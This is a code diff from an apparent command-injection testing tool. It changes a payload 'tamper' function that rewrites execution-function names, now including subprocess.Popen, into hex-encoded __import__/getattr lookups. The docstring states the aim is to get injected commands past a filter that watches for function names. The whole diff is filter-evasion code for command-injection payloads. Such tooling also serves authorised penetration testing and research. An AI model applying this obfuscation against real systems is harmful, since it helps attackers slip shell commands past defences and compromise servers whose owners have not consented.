@@ -61,10 +61,21 @@ escaped name the way a string can - 'getattr' is what turns the name back into t
 def _looked_up(module, attribute):
   return ATTRIBUTE_OF + IMPORT_OF + _hex_name(module) + ")," + _hex_name(attribute) + ")"
 
+"""
+The callable the grammar's own reader runs a command through, which is none of the execution
+functions above.
+
+A payload reaches a shell twice over - through the function a boundary is built around, and through
+the reader every answer is read back off - and a filter watching for a name is watching for it in
+both. Named here as well, so the reader arrives spelled the same way the rest of the payload is.
+"""
+READER_FUNCTIONS = ["__import__(\"subprocess\").Popen"]
+
 # Run the command through a module and function named in hex, wherever the payload runs one.
 def tamper(payload):
   # Longest first, so a bare name is not rewritten out of the middle of an imported one.
-  for name in sorted(settings.EXECUTION_FUNCTIONS_LVL3, key=len, reverse=True):
+  named = set(settings.EXECUTION_FUNCTIONS_LVL3) | set(READER_FUNCTIONS)
+  for name in sorted(named, key=len, reverse=True):
     imported = re.match(IMPORTED_FUNCTION, name)
     if imported:
       looked_up = _looked_up(imported.group(1), imported.group(2))
